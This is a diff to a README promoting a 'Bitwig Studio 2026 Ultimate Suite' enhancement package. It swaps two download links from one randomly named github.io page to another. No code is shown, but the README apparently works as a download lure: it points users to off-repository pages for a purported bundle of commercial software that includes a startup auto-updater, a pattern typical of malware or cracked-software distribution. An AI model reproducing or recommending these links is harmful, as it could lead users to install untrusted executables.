@@ -4,7 +4,7 @@ Bitwig Studio 2026 Ultimate Suite is a comprehensive enhancement package designe
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Version-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Version-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
@@ -76,7 +76,7 @@ A: The package includes an auto-update checker that runs on startup. When a new 
 
 Ready to enhance your Bitwig Studio experience? Download the latest release from our official page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 For questions, feedback, or suggestions, feel free to open an issue in this repository. Your input helps us improve the Ultimate Suite for all users.
 
